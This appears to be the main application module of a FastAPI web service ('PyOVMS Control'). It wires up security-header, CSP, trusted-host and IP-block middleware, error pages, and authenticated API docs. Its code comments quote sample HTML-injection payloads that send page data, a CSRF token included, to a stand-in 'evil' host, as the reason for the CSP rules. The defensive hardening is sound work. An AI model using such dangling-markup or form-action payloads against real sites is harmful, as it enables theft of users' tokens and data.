import json
import logging.config
from pathlib import Path
import secrets
import traceback

from fastapi import FastAPI, Request, HTTPException, status as http_status, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.openapi.utils import get_openapi
from fastapi.exceptions import RequestValidationError
from fastapi.encoders import jsonable_encoder
from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint
from starlette.responses import Response
from starlette.staticfiles import StaticFiles
from starlette.middleware.sessions import SessionMiddleware
from starlette.middleware.trustedhost import TrustedHostMiddleware
from fastapi.openapi.docs import swagger_ui_default_parameters
from jinja2 import TemplateNotFound, TemplateSyntaxError, UndefinedError
from starlette.exceptions import HTTPException as StarletteHTTPException
from fastapi.utils import is_body_allowed_for_status_code
from fastapi_babel import BabelMiddleware
from fastapi.middleware.cors import CORSMiddleware

from app.logging_config import LOGGING_CONFIG
logging.config.dictConfig(LOGGING_CONFIG)

from app.config import settings
from app.lifespan import lifespan
from app.dependencies import require_current_user_from_cookie_fully_authenticated, get_client_ip
from app.i18n import babel_configs, get_locale
from app.routers.ui import templates, custom_datetime_formatter, tojson_filter, humanize_key
from app.routers.api.main import router as api_router
from app.routers.ui.main import router as ui_router
from app.routers.ws import router as ws_router
from app.security_manager import security_manager
from app.utils.urls import trusted_hosts

from app.services.karto_docs import load_fragment, merge_karto_documentation

try:
    from app.services.charge_logger.api import router as charge_logger_router
except ImportError as e:
    logging.getLogger(__name__).error(f"Could not import Charge Logger service router: {e}. Charge Log API will be disabled.")
    charge_logger_router = None


module_logger = logging.getLogger(__name__)

class SecurityMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        client_ip = await get_client_ip(request)
        if security_manager.is_blocked(client_ip):
            return JSONResponse(
                status_code=http_status.HTTP_429_TOO_MANY_REQUESTS,
                content={"detail": "Too many failed login attempts. Please try again later."},
            )
        response = await call_next(request)
        return response

class RemoveServerHeaderMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        response = await call_next(request)
        if 'server' in response.headers:
            del response.headers['server']
        return response

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """Add security headers to all responses."""
    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        # Generate a per-request nonce for inline scripts so we can drop unsafe-inline
        nonce = secrets.token_urlsafe(16)
        request.state.csp_nonce = nonce

        response = await call_next(request)

        # Prevent MIME type sniffing
        response.headers['X-Content-Type-Options'] = 'nosniff'

        # Prevent clickjacking
        response.headers['X-Frame-Options'] = 'DENY'

        # XSS Protection (legacy, but still useful for older browsers)
        response.headers['X-XSS-Protection'] = '1; mode=block'

        # Content Security Policy
        csp_directives = [
            "default-src 'self'",
            f"script-src 'self' 'nonce-{nonce}'",
            f"style-src 'self' 'nonce-{nonce}'",  # Alpine CSP build uses no eval; nonce covers <style> blocks
            # 'self' only: a wildcard here (https:) turns any HTML injection into a
            # data exfiltration channel via dangling markup (<img src="https://evil/?x=
            # swallows the rest of the document up to the next quote, CSRF token included).
            "img-src 'self' data:",
            "font-src 'self' data:",
            # 'self' also matches same-origin ws:/wss: per CSP3, so the WebSocket
            # endpoints keep working without allowing connections to arbitrary hosts.
            "connect-src 'self'",
            "worker-src blob:",  # ReDoc uses a blob: web worker
            "frame-ancestors 'none'",
            # form-action and base-uri do NOT fall back to default-src. Without them an
            # injected <form action="https://evil/"> or <base href> stays functional even
            # under an otherwise strict policy.
            "form-action 'self'",
            "base-uri 'self'",
            "object-src 'none'",
        ]
        response.headers['Content-Security-Policy'] = '; '.join(csp_directives)

        # Strict Transport Security (HSTS) - only if using HTTPS
        if request.url.scheme == 'https' or settings.FORCE_SECURE_COOKIES:
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'

        # Permissions Policy (formerly Feature-Policy)
        permissions = [
            "geolocation=()",
            "microphone=()",
            "camera=()",
            "payment=()",
            "usb=()",
        ]
        response.headers['Permissions-Policy'] = ', '.join(permissions)

        # Referrer Policy
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

        return response

app = FastAPI(
    title="PyOVMS Control",
    lifespan=lifespan,
    version=settings.SERVER_VERSION,
    docs_url=None,
    redoc_url=None,
    openapi_url=None,
)

def custom_openapi():
    if app.openapi_schema:
        return app.openapi_schema

    openapi_schema = get_openapi(
        title=app.title,
        version=app.version,
        routes=app.routes,
    )

    # Ensure components exist
    if "components" not in openapi_schema:
        openapi_schema["components"] = {}
    if "securitySchemes" not in openapi_schema["components"]:
        openapi_schema["components"]["securitySchemes"] = {}

    # Merge with any auto-generated security schemes and add descriptions
    security_schemes = openapi_schema["components"]["securitySchemes"]

    # Update or add API Key security scheme with better description
    for scheme_name in list(security_schemes.keys()):
        scheme = security_schemes[scheme_name]
        if scheme.get("type") == "apiKey" and scheme.get("name") == "X-API-Key":
            scheme["description"] = "API Key for programmatic access. Generate one from your user profile."

    # Add cookie auth documentation if not present (for informational purposes)
    if "SessionCookie" not in security_schemes:
        security_schemes["SessionCookie"] = {
            "type": "apiKey",
            "in": "cookie",
            "name": "access_token",
            "description": "Session cookie for web UI authentication (automatically set after login)"
        }

    # The Karto trip API is served by a separate process behind the reverse proxy, so
    # this application has no routes to describe it. Its schema is exported from that
    # service and merged in here — see app/services/karto_docs.py for why a copy of
    # its routers used to live in this repo and why it no longer does.
    if settings.ENABLE_KARTO_TRIP_TRACKING:
        openapi_schema = merge_karto_documentation(openapi_schema, load_fragment())

    app.openapi_schema = openapi_schema
    return app.openapi_schema

app.openapi = custom_openapi

# Middleware registration order.
#
#     SecurityHeaders -> RemoveServerHeader -> CORS -> Security -> Session -> Babel
#
# It used to be registered in exactly that reading order, which produced the mirror
# image: SecurityHeadersMiddleware ended up innermost. That matters because
# SecurityMiddleware short-circuits blocked IPs with its own JSONResponse — a
# response the header middleware never saw. Every 429 from the IP blocklist went out
# without CSP, X-Frame-Options or nosniff, and with the `server` header still on it.
origins = [
    str(settings.SERVER_BASE_URL).rstrip('/'),
]
if "localhost" in settings.SERVER_BASE_URL or "127.0.0.1" in settings.SERVER_BASE_URL:
    origins.extend([
        "http://localhost",
        f"http://localhost:{settings.HTTP_PORT}",
        "http://127.0.0.1",
        f"http://127.0.0.1:{settings.HTTP_PORT}",
    ])

# --- innermost first ---------------------------------------------------------
app.add_middleware(BabelMiddleware, babel_configs=babel_configs, locale_selector=get_locale, jinja2_templates=templates)
app.add_middleware(
    SessionMiddleware,
    secret_key=settings.SECRET_KEY_SESSION,
    https_only=settings.FORCE_SECURE_COOKIES,
    same_site="lax",
    max_age=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
)
app.add_middleware(SecurityMiddleware)
app.add_middleware(
    CORSMiddleware,
    allow_origins=list(set(origins)),
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization", "X-API-Key", "X-Requested-With"],
)
# A request whose Host header does not belong to this deployment is rejected before
# any router, logger or template sees it. The bundled nginx config forwards
# `Host $host` unchanged, so without this every Host-derived value is
# attacker-controlled. The mailed links no longer depend on it (app/utils/urls.py),
# but redirects, `request.base_url` and anything added later still do, and this is
# the layer that holds for those without each one having to remember.
#
# Registered *inside* the two header middlewares on purpose. It answers a bad Host
# with its own 400, and that short-circuit response has to carry CSP, nosniff and no
# `server` header — the same reason M-20 moved SecurityHeadersMiddleware outwards.
app.add_middleware(TrustedHostMiddleware, allowed_hosts=trusted_hosts())
app.add_middleware(RemoveServerHeaderMiddleware)
app.add_middleware(SecurityHeadersMiddleware)
# --- outermost last ----------------------------------------------------------

PROJECT_ROOT = Path(__file__).resolve().parent
STATIC_DIR = PROJECT_ROOT / "static"
if not STATIC_DIR.is_dir():
    module_logger.error(f"Static directory not found at the calculated path: {STATIC_DIR}")
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

templates.env.filters['datetimeformat'] = custom_datetime_formatter
templates.env.filters['tojson'] = tojson_filter
templates.env.filters['humanize_key'] = humanize_key

def _wants_html_error_page(request: Request) -> bool:
    """
    True when this request is a browser looking at a page, not code reading a response.

    Anything else has to keep getting JSON: the fetch() callers in the templates read
    `detail` out of the body, and the API clients depend on it entirely.

    `Sec-Fetch-Mode` is the reliable signal — every browser that can reach these pages
    sends it, and only a top-level navigation carries "navigate". The Accept header is
    the fallback for the rest.
    """
    if request.url.path.startswith(("/api/", "/static/", "/ws")):
        return False
    if request.headers.get("x-requested-with") == "XMLHttpRequest":
        return False

    fetch_mode = request.headers.get("sec-fetch-mode")
    if fetch_mode is not None:
        return fetch_mode == "navigate"

    return "text/html" in request.headers.get("accept", "")


def _render_error_page(request: Request, status_code: int, detail: str) -> Response:
    """
    The styled equivalent of the raw `{"detail": ...}` body.

    A CSRF failure on a form POST used to land here as a page of JSON text, which reads
    as a crash rather than as "your token aged out, reload and try again" — so that case
    gets its own explanation. Rendering must never be able to fail: the fallback is the
    JSON body this replaces, not a second exception.
    """
    is_csrf_error = "csrf" in detail.lower()

    try:
        from app.routers.ui import get_common_template_vars

        context = get_common_template_vars(request, None)
        context.update({
            "page_title": "Error",
            "status_code": status_code,
            # The heading is chosen in error.html rather than here so pybabel can
            # extract it. A literal built in Python and passed through `_()` in the
            # template is invisible to the extractor and stays English forever.
            "error_detail": "" if status_code == 422 else detail,
            "is_csrf_error": is_csrf_error,
            # A CSRF failure is always a POST; sending the browser back to the same URL
            # with GET is what re-renders the form with a token that works.
            "retry_url": str(request.url),
            "home_url": str(request.base_url),
        })
        return templates.TemplateResponse(request, "error.html", context, status_code=status_code)
    except Exception:
        module_logger.exception("Failed to render the HTML error page; falling back to JSON")
        return JSONResponse(status_code=status_code, content={"detail": detail})


@app.exception_handler(StarletteHTTPException)
async def http_exception_handler(request: Request, exc: StarletteHTTPException):
    # Redirects are raised as HTTPException by the auth dependencies (307 + Location),
    # so only genuine errors may be turned into a page.
    headers = getattr(exc, "headers", None)
    if exc.status_code >= 400 and _wants_html_error_page(request):
        return _render_error_page(request, exc.status_code, str(exc.detail))
    # 204/304 must not carry one, and the auth dependencies raise 307 with a Location.
    if not is_body_allowed_for_status_code(exc.status_code):
        return Response(status_code=exc.status_code, headers=headers)
    return JSONResponse(status_code=exc.status_code, content={"detail": exc.detail}, headers=headers)


@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request: Request, exc: RequestValidationError):
    # A form posted without its csrf_token field never reaches verify_csrf_token(); it
    # fails here first, and the default body is a nested list of pydantic errors.
    if _wants_html_error_page(request):
        return _render_error_page(request, http_status.HTTP_422_UNPROCESSABLE_ENTITY, "")
    return JSONResponse(
        status_code=http_status.HTTP_422_UNPROCESSABLE_ENTITY,
        content={"detail": jsonable_encoder(exc.errors())},
    )


@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    tb_str = "".join(traceback.format_exception(type(exc), exc, exc.__traceback__))
    module_logger.error(f"Unhandled exception for {request.method} {request.url.path}:\n{tb_str}")
    if isinstance(exc, HTTPException):
        return await http_exception_handler(request, exc)
    detail = "Internal server error. Please check server logs for details."
    if _wants_html_error_page(request):
        return _render_error_page(request, http_status.HTTP_500_INTERNAL_SERVER_ERROR, detail)
    return JSONResponse(
        status_code=http_status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={"detail": detail},
    )

@app.exception_handler(TemplateNotFound)
async def handle_template_not_found(request: Request, exc: TemplateNotFound):
    module_logger.error(f"Template not found: {exc.name} for request {request.url.path}", exc_info=exc)
    return JSONResponse(
        status_code=http_status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={"detail": "Internal server error."},
    )

@app.exception_handler(TemplateSyntaxError)
async def handle_template_syntax_error(request: Request, exc: TemplateSyntaxError):
    module_logger.error(f"Template syntax error: {exc.message} in {exc.filename} at line {exc.lineno}", exc_info=exc)
    return JSONResponse(
        status_code=http_status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={"detail": f"Internal server error: Template syntax error in '{exc.filename}'."},
    )

@app.exception_handler(UndefinedError)
async def handle_template_undefined_error(request: Request, exc: UndefinedError):
    module_logger.error(f"Template undefined variable error: {exc.message}. The '_' function might not be correctly injected into the template context.", exc_info=exc)
    return JSONResponse(
        status_code=http_status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={"detail": f"Internal server error: Template undefined variable '{exc.message}'."},
    )

app.include_router(api_router)
app.include_router(ui_router)
app.include_router(ws_router)

if settings.ENABLE_KARTO_TRIP_TRACKING:
    # No router: /api/karto/ belongs to the Karto service and is routed there by the
    # reverse proxy. Only its documentation is merged, in custom_openapi() above.
    module_logger.info("Karto Trip Tracking enabled; its API documentation is merged into /docs.")

if charge_logger_router:
    app.include_router(charge_logger_router)
    module_logger.info("Charge Logger API endpoints enabled and included.")


@app.get("/health", tags=["System"])
async def health_check():
    return {"status": "ok"}

@app.get("/openapi.json", include_in_schema=False, name="openapi_json",
         dependencies=[Depends(require_current_user_from_cookie_fully_authenticated)])
async def get_open_api_endpoint_protected(request: Request):
    return app.openapi()

@app.get("/docs", include_in_schema=False, response_class=HTMLResponse, name="swagger_ui_docs",
         dependencies=[Depends(require_current_user_from_cookie_fully_authenticated)])
async def custom_swagger_ui_html_protected(request: Request):
    nonce = getattr(request.state, 'csp_nonce', '')
    openapi_url = str(request.url_for('openapi_json'))
    js_url = str(request.url_for('static', path='/js/swagger-ui-bundle.js'))
    css_url = str(request.url_for('static', path='/css/swagger-ui.css'))
    favicon_url = str(request.url_for('static', path='img/favicon-32x32.png'))
    params = swagger_ui_default_parameters.copy()
    params.update({"persistAuthorization": True, "displayRequestDuration": True, "filter": True})
    params_js = json.dumps(params, indent=4)[1:-1].strip()  # dict body without outer braces
    html = f"""<!DOCTYPE html>
<html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="{css_url}">
<link rel="shortcut icon" href="{favicon_url}">
<title>{app.title} - API Docs</title>
</head><body>
<div id="swagger-ui"></div>
<script src="{js_url}"></script>
<script nonce="{nonce}">
const ui = SwaggerUIBundle({{
    url: '{openapi_url}',
    {params_js},
    presets: [SwaggerUIBundle.presets.apis, SwaggerUIBundle.SwaggerUIStandalonePreset],
}});
</script>
</body></html>"""
    return HTMLResponse(html)

@app.get("/redoc", include_in_schema=False, response_class=HTMLResponse, name="redoc_docs",
         dependencies=[Depends(require_current_user_from_cookie_fully_authenticated)])
async def custom_redoc_html_protected(request: Request):
    nonce = getattr(request.state, 'csp_nonce', '')
    openapi_url = str(request.url_for('openapi_json'))
    js_url = str(request.url_for('static', path='/js/redoc.standalone.js'))
    favicon_url = str(request.url_for('static', path='img/favicon-32x32.png'))
    html = f"""<!DOCTYPE html>
<html><head>
<title>{app.title} - API Docs</title>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="{favicon_url}">
<style nonce="{nonce}">body {{ margin: 0; padding: 0; }}</style>
</head><body>
<noscript>ReDoc requires Javascript to function. Please enable it to browse the documentation.</noscript>
<div id="redoc-container"></div>
<script src="{js_url}" nonce="{nonce}"></script>
<script nonce="{nonce}">
Redoc.init('{openapi_url}', {{nonce: '{nonce}'}}, document.getElementById('redoc-container'));
</script>
</body></html>"""
    return HTMLResponse(html)